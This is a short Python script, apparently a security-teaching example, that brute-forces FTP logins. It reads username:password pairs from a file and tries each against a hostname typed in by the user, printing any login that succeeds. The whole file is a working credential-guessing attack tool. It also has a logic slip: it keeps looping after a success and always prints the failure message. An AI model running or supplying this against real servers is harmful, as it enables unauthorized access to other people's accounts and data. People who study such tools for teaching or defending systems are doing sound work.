#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
import ftplib

def bruteLogin(hostname,passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: '+username+"/"+password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print('\n[*] '+str(hostname)+' FTP Logon Succeeded: '+username+"/"+password)
        except Exception:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)

def main():
    while True:
        h = input("[*] Please enter the hostname: ")
        f = input("[*] Please enter the filename: ")
        bruteLogin(h, f)
        print()

if __name__ == '__main__':
    main()